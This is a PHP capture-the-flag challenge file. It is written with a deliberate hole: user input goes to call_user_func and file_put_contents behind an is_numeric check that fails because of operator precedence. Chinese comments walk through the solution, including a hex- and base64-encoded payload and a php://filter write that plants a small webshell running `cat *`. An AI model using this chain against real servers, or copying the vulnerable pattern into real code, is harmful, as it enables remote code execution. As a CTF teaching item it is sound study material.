<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
echo $v1."</br>";
$v2 = $_GET['v2'];
echo $v2."</br>";
$v3 = $_GET['v3'];
echo $v3."</br>";
// v2 v3 必须有一个是数字
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    // v2 从第二个字节开始截取
    $s = substr($v2,2);
    echo $s."</br>";
    // call_user_func 将第一个参数作为回调函数调用
    $str = call_user_func($v1,$s);
    echo $str;
    // file_put_contents() 函数把一个字符串写入文件中。
    // v3 文件地址 str文件内容
    file_put_contents($v3,$str);
    /*
payload:
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php
POST
v1=hex2bin
     */
    // hex2bin — 转换十六进制字符串为二进制字符串
    //hex2bin
    //115044383959474e6864434171594473
    //php://filter/write=convert.base64-decode/resource=2.php
    //5044383959474e6864434171594473
    //PD89YGNhdCAqYDs => <?= `cat *`;
}
else{
    die('hacker');
}


